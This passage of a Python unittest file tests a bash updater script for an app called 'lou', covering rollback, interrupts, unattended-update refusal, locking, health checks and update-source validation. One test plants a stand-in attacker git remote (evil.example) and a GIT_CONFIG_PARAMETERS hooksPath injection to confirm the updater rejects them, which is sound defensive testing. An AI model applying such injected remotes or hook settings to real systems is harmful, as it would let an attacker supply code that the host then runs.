        code = f'''CANDIDATE={self.new} CURRENT={self.old} STAGE= PREVIOUS={self.releases / RELEASE}
                   WAS_ACTIVE=true PHASE=verify; rollback 'failed its health check' '''
        result = self.run_flow(code)
        self.assertEqual(result.returncode, 3)
        self.assertIn('refusing to guess', result.stderr)
        self.assertEqual((self.app / 'marker').read_text(), 'old release')

    def test_interrupt_during_build_removes_only_the_candidate(self):
        result = self.run_flow('build_in_sandbox() { kill -TERM $$; }; ASSUME_YES=true; update_flow')
        self.assertEqual(result.returncode, 1, result.stdout + result.stderr)
        self.assertIn('interrupted', result.stderr)
        self.assertEqual(self.stages(), [])
        self.assertNotIn('stop lou', self.syslog())
        self.assertEqual((self.app / 'marker').read_text(), 'old release')

    def test_unattended_run_declines_modified_or_unknown_installs(self):
        for info in [{'commit': self.old, 'dirty': True}, None]:
            if info:
                (self.app / support.RELEASE_FILE).write_text(json.dumps(info))
            else:
                (self.app / support.RELEASE_FILE).unlink()
            result = self.run_flow('ASSUME_YES=true; update_flow')
            with self.subTest(info=info):
                self.assertEqual(result.returncode, 4, result.stdout + result.stderr)
                self.assertIn('Automatic update declined', result.stderr)
                self.assertEqual(self.stages(), [])

    def test_unattended_run_declines_systemd_unit_changes(self):
        (self.root / 'etc/systemd/system/lou.service').write_text('[Service]\nUser=root\n')
        result = self.run_flow('ASSUME_YES=true; update_flow', env={'CANDIDATE_HEALTHY': '1'})
        self.assertEqual(result.returncode, 4, result.stdout + result.stderr)
        self.assertIn('changes systemd units', result.stderr)
        self.assertNotIn('stop lou', self.syslog())
        self.assertEqual(self.stages(), [])

    def test_lock_is_shared_and_exclusive(self):
        lock = self.root / 'var/lib/lou-updater/lock'
        with open(lock, 'a') as held:
            fcntl.flock(held, fcntl.LOCK_EX)
            result = self.run_flow('ASSUME_YES=true; update_flow')
        self.assertEqual(result.returncode, 75)
        self.assertIn('already running', result.stdout)
        setup_lock = self.root / 'run/lou-setup.lock'
        with open(setup_lock, 'a') as held:
            fcntl.flock(held, fcntl.LOCK_EX)
            result = self.run_flow('ASSUME_YES=true; update_flow')
        self.assertEqual(result.returncode, 75)
        self.assertIn('setup is running', result.stdout)

    def test_environment_cannot_choose_the_update_source(self):
        env = {'LOU_UPDATE_REMOTE': 'https://evil.example/lou.git', 'LOU_UPDATE_BRANCH': 'evil',
               'GIT_DIR': str(self.root), 'GIT_CONFIG_PARAMETERS': "'core.hooksPath=/tmp'"}
        result = self.run_flow('MODE=check; update_flow; ', env=env)
        self.assertEqual(result.returncode, 10, result.stderr)
        self.assertIn('main, https://github.com/a-riceeater/lou.git', result.stdout)
        self.assertNotIn('evil', result.stdout + result.stderr)
        (self.root / 'etc/lou/update.conf').write_text('LOU_UPDATE_REMOTE="file:///srv/lou"\nLOU_UPDATE_BRANCH="main"\n')
        result = self.run_flow('MODE=check; update_flow')
        self.assertEqual(result.returncode, 1)
        self.assertIn('Invalid', result.stderr)

    def test_real_git_policy_refuses_non_https_transports(self):
        code = f'''MIRROR=$ROOT/policy.git; unset -f git_mirror; source "$1"
                   MIRROR=$ROOT/policy.git UPDATE_STATE=$ROOT/var/lib/lou-updater
                   git_mirror init --quiet --bare --template=
                   git_mirror fetch --quiet {self.remote} +refs/heads/main:refs/x'''
        result = self.run_flow(code)
        self.assertNotEqual(result.returncode, 0)
        self.assertIn('not allowed', result.stderr)

    def test_health_verification_distinguishes_start_health_and_stability(self):
        cases = {
            'failed': 'printf failed > "$ROOT/state"',
            'restarting': '''lou_property() {
                local n
                case $1 in
                    ActiveState) printf active ;;
                    MainPID) n=$(( $(cat "$ROOT/pid" 2>/dev/null || printf 0) + 1 )); printf '%s' "$n" > "$ROOT/pid"; printf '%s' "$n" ;;
                    *) printf 0 ;;
                esac
            }''',
            'unhealthy': 'unlink "$APP/.healthy"',
        }
        for name, setup in cases.items():
            result = self.run_flow(f'{setup}; HEALTH_SECONDS=3; verify_service')
            with self.subTest(name=name):
                self.assertNotEqual(result.returncode, 0)
        result = self.run_flow('verify_service')
        self.assertEqual(result.returncode, 0, result.stderr)


if __name__ == '__main__':
    unittest.main()
